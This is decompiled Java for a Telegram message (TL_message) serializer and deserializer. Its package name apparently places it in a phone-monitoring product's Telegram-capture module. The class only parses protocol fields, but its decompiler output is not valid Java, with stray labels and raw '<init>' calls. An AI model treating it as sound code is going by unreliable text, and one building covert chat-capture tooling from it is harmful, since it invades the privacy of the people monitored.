package com.vvt.capture.telegram.internal;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map.Entry;
import java.util.Set;

public class TLRPC$TL_message
  extends TLRPC.Message
{
  public static int constructor = -1063525281;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = 1;
    int j = paramAbstractSerializedData.readInt32(paramBoolean);
    this.flags = j;
    j = this.flags & 0x1;
    label53:
    label76:
    label99:
    label123:
    label147:
    Object localObject1;
    if (j != 0)
    {
      j = i;
      this.unread = j;
      j = this.flags & 0x2;
      if (j == 0) {
        break label559;
      }
      j = i;
      this.out = j;
      j = this.flags & 0x10;
      if (j == 0) {
        break label568;
      }
      j = i;
      this.mentioned = j;
      j = this.flags & 0x20;
      if (j == 0) {
        break label577;
      }
      j = i;
      this.media_unread = j;
      j = this.flags & 0x2000;
      if (j == 0) {
        break label586;
      }
      j = i;
      this.silent = j;
      j = this.flags & 0x4000;
      if (j == 0) {
        break label595;
      }
      j = i;
      this.post = j;
      j = paramAbstractSerializedData.readInt32(paramBoolean);
      this.id = j;
      j = this.flags & 0x100;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        this.from_id = j;
      }
      j = paramAbstractSerializedData.readInt32(paramBoolean);
      localObject1 = TLRPC.Peer.TLdeserialize(paramAbstractSerializedData, j, paramBoolean);
      this.to_id = ((TLRPC.Peer)localObject1);
      j = this.from_id;
      if (j == 0)
      {
        localObject1 = this.to_id;
        j = ((TLRPC.Peer)localObject1).user_id;
        if (j == 0) {
          break label604;
        }
        localObject1 = this.to_id;
        j = ((TLRPC.Peer)localObject1).user_id;
      }
    }
    int i1;
    int i2;
    Object localObject2;
    Object localObject3;
    for (this.from_id = j;; this.from_id = j)
    {
      j = this.flags & 0x4;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        localObject1 = TLRPC.TL_messageFwdHeader.TLdeserialize(paramAbstractSerializedData, j, paramBoolean);
        this.fwd_from = ((TLRPC.TL_messageFwdHeader)localObject1);
      }
      j = this.flags & 0x800;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        this.via_bot_id = j;
      }
      j = this.flags & 0x8;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        this.reply_to_msg_id = j;
      }
      j = paramAbstractSerializedData.readInt32(paramBoolean);
      this.date = j;
      localObject1 = paramAbstractSerializedData.readString(paramBoolean);
      this.message = ((String)localObject1);
      j = this.flags & 0x200;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        localObject1 = TLRPC.MessageMedia.TLdeserialize(paramAbstractSerializedData, j, paramBoolean);
        this.media = ((TLRPC.MessageMedia)localObject1);
      }
      j = this.flags & 0x40;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        localObject1 = TLRPC.ReplyMarkup.TLdeserialize(paramAbstractSerializedData, j, paramBoolean);
        this.reply_markup = ((TLRPC.ReplyMarkup)localObject1);
      }
      j = this.flags & 0x80;
      if (j == 0) {
        break label674;
      }
      j = paramAbstractSerializedData.readInt32(paramBoolean);
      i1 = 481674261;
      if (j != i1) {
        break label627;
      }
      i1 = paramAbstractSerializedData.readInt32(paramBoolean);
      j = 0;
      localObject1 = null;
      while (j < i1)
      {
        i2 = paramAbstractSerializedData.readInt32(paramBoolean);
        localObject2 = TLRPC.MessageEntity.TLdeserialize(paramAbstractSerializedData, i2, paramBoolean);
        if (localObject2 == null) {
          return;
        }
        localObject3 = this.entities;
        ((ArrayList)localObject3).add(localObject2);
        j += 1;
      }
      j = 0;
      localObject1 = null;
      break;
      label559:
      j = 0;
      localObject1 = null;
      break label53;
      label568:
      j = 0;
      localObject1 = null;
      break label76;
      label577:
      j = 0;
      localObject1 = null;
      break label99;
      label586:
      j = 0;
      localObject1 = null;
      break label123;
      label595:
      j = 0;
      localObject1 = null;
      break label147;
      label604:
      localObject1 = this.to_id;
      j = -((TLRPC.Peer)localObject1).channel_id;
    }
    label627:
    if (paramBoolean)
    {
      Object localObject4 = new Object[i];
      localObject1 = Integer.valueOf(j);
      localObject4[0] = localObject1;
      localObject1 = new java/lang/RuntimeException;
      localObject4 = String.format("wrong Vector magic, got %x", (Object[])localObject4);
      ((RuntimeException)localObject1).<init>((String)localObject4);
      throw ((Throwable)localObject1);
      label674:
      j = this.flags & 0x400;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        this.views = j;
      }
      j = this.flags;
      i1 = 32768;
      j &= i1;
      if (j != 0)
      {
        j = paramAbstractSerializedData.readInt32(paramBoolean);
        this.edit_date = j;
      }
      j = this.id;
      Object localObject5;
      if (j >= 0)
      {
        localObject1 = this.media;
        if (localObject1 != null)
        {
          localObject1 = this.media;
          boolean bool1 = localObject1 instanceof TLRPC.TL_messageMediaEmpty;
          if (!bool1)
          {
            localObject1 = this.media;
            bool1 = localObject1 instanceof TLRPC.TL_messageMediaWebPage;
            if (!bool1)
            {
              localObject1 = this.message;
              if (localObject1 != null)
              {
                localObject1 = this.message;
                int k = ((String)localObject1).length();
                if (k != 0)
                {
                  localObject1 = this.message;
                  localObject5 = "-1";
                  boolean bool2 = ((String)localObject1).startsWith((String)localObject5);
                  if (!bool2) {}
                }
              }
            }
          }
        }
      }
      else
      {
        localObject1 = paramAbstractSerializedData.readString(paramBoolean);
        this.attachPath = ((String)localObject1);
        int m = this.id;
        if (m < 0)
        {
          localObject1 = this.attachPath;
          localObject5 = "||";
          boolean bool3 = ((String)localObject1).startsWith((String)localObject5);
          if (bool3)
          {
            localObject1 = this.attachPath;
            localObject5 = ((String)localObject1).split("\\|\\|");
            n = localObject5.length;
            if (n > 0)
            {
              localObject1 = new java/util/HashMap;
              ((HashMap)localObject1).<init>();
              this.params = ((HashMap)localObject1);
              n = i;
              for (;;)
              {
                i2 = localObject5.length + -1;
                if (n >= i2) {
                  break;
                }
                localObject2 = localObject5[n];
                localObject3 = "\\|=\\|";
                localObject2 = ((String)localObject2).split((String)localObject3);
                int i3 = localObject2.length;
                int i4 = 2;
                if (i3 == i4)
                {
                  localObject3 = this.params;
                  Object localObject6 = localObject2[0];
                  localObject2 = localObject2[i];
                  ((HashMap)localObject3).put(localObject6, localObject2);
                }
                n += 1;
              }
              n = localObject5.length + -1;
              localObject1 = localObject5[n];
              this.attachPath = ((String)localObject1);
            }
          }
        }
      }
      int n = this.flags & 0x4;
      if (n != 0)
      {
        n = this.id;
        if (n < 0)
        {
          n = paramAbstractSerializedData.readInt32(paramBoolean);
          this.fwd_msg_id = n;
        }
      }
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    boolean bool1 = this.unread;
    if (bool1)
    {
      int j = this.flags | 0x1;
      this.flags = j;
      boolean bool2 = this.out;
      if (!bool2) {
        break label416;
      }
      int k = this.flags | 0x2;
      label46:
      this.flags = k;
      boolean bool3 = this.mentioned;
      if (!bool3) {
        break label427;
      }
      int m = this.flags | 0x10;
      label68:
      this.flags = m;
      boolean bool4 = this.media_unread;
      if (!bool4) {
        break label438;
      }
      int n = this.flags | 0x20;
      label90:
      this.flags = n;
      boolean bool5 = this.silent;
      if (!bool5) {
        break label449;
      }
      int i1 = this.flags | 0x2000;
      label113:
      this.flags = i1;
      boolean bool6 = this.post;
      if (!bool6) {
        break label461;
      }
    }
    Object localObject2;
    label416:
    label427:
    label438:
    label449:
    label461:
    for (int i2 = this.flags | 0x4000;; i2 = this.flags & 0xBFFF)
    {
      this.flags = i2;
      i2 = this.flags;
      paramAbstractSerializedData.writeInt32(i2);
      i2 = this.id;
      paramAbstractSerializedData.writeInt32(i2);
      i2 = this.flags & 0x100;
      if (i2 != 0)
      {
        i2 = this.from_id;
        paramAbstractSerializedData.writeInt32(i2);
      }
      localObject1 = this.to_id;
      ((TLRPC.Peer)localObject1).serializeToStream(paramAbstractSerializedData);
      i2 = this.flags & 0x4;
      if (i2 != 0)
      {
        localObject1 = this.fwd_from;
        ((TLRPC.TL_messageFwdHeader)localObject1).serializeToStream(paramAbstractSerializedData);
      }
      i2 = this.flags & 0x800;
      if (i2 != 0)
      {
        i2 = this.via_bot_id;
        paramAbstractSerializedData.writeInt32(i2);
      }
      i2 = this.flags & 0x8;
      if (i2 != 0)
      {
        i2 = this.reply_to_msg_id;
        paramAbstractSerializedData.writeInt32(i2);
      }
      i2 = this.date;
      paramAbstractSerializedData.writeInt32(i2);
      localObject1 = this.message;
      paramAbstractSerializedData.writeString((String)localObject1);
      i2 = this.flags & 0x200;
      if (i2 != 0)
      {
        localObject1 = this.media;
        ((TLRPC.MessageMedia)localObject1).serializeToStream(paramAbstractSerializedData);
      }
      i2 = this.flags & 0x40;
      if (i2 != 0)
      {
        localObject1 = this.reply_markup;
        ((TLRPC.ReplyMarkup)localObject1).serializeToStream(paramAbstractSerializedData);
      }
      i2 = this.flags & 0x80;
      if (i2 == 0) {
        break label473;
      }
      paramAbstractSerializedData.writeInt32(481674261);
      int i4 = this.entities.size();
      paramAbstractSerializedData.writeInt32(i4);
      i2 = 0;
      localObject1 = null;
      i5 = 0;
      localObject2 = null;
      while (i5 < i4)
      {
        localObject1 = (TLRPC.MessageEntity)this.entities.get(i5);
        ((TLRPC.MessageEntity)localObject1).serializeToStream(paramAbstractSerializedData);
        i2 = i5 + 1;
        i5 = i2;
      }
      i2 = this.flags & 0xFFFFFFFE;
      break;
      i2 = this.flags & 0xFFFFFFFD;
      break label46;
      i2 = this.flags & 0xFFFFFFEF;
      break label68;
      i2 = this.flags & 0xFFFFFFDF;
      break label90;
      i2 = this.flags & 0xDFFF;
      break label113;
    }
    label473:
    i2 = this.flags & 0x400;
    if (i2 != 0)
    {
      i2 = this.views;
      paramAbstractSerializedData.writeInt32(i2);
    }
    i2 = this.flags;
    int i5 = 32768;
    i2 &= i5;
    if (i2 != 0)
    {
      i2 = this.edit_date;
      paramAbstractSerializedData.writeInt32(i2);
    }
    Object localObject1 = this.attachPath;
    i5 = this.id;
    if (i5 < 0)
    {
      localObject2 = this.params;
      if (localObject2 != null)
      {
        localObject2 = this.params;
        i5 = ((HashMap)localObject2).size();
        if (i5 > 0)
        {
          localObject2 = this.params.entrySet();
          Iterator localIterator = ((Set)localObject2).iterator();
          for (Object localObject3 = localObject1;; localObject3 = localObject1)
          {
            boolean bool7 = localIterator.hasNext();
            if (!bool7) {
              break;
            }
            localObject1 = (Map.Entry)localIterator.next();
            Object localObject4 = new java/lang/StringBuilder;
            ((StringBuilder)localObject4).<init>();
            localObject2 = (String)((Map.Entry)localObject1).getKey();
            localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
            localObject4 = "|=|";
            localObject2 = ((StringBuilder)localObject2).append((String)localObject4);
            localObject1 = (String)((Map.Entry)localObject1).getValue();
            localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
            localObject2 = "||";
            localObject1 = (String)localObject2 + (String)localObject3;
          }
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          localObject2 = "||";
          localObject1 = (String)localObject2 + (String)localObject3;
        }
      }
    }
    paramAbstractSerializedData.writeString((String)localObject1);
    int i3 = this.flags & 0x4;
    if (i3 != 0)
    {
      i3 = this.id;
      if (i3 < 0)
      {
        i3 = this.fwd_msg_id;
        paramAbstractSerializedData.writeInt32(i3);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_message.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */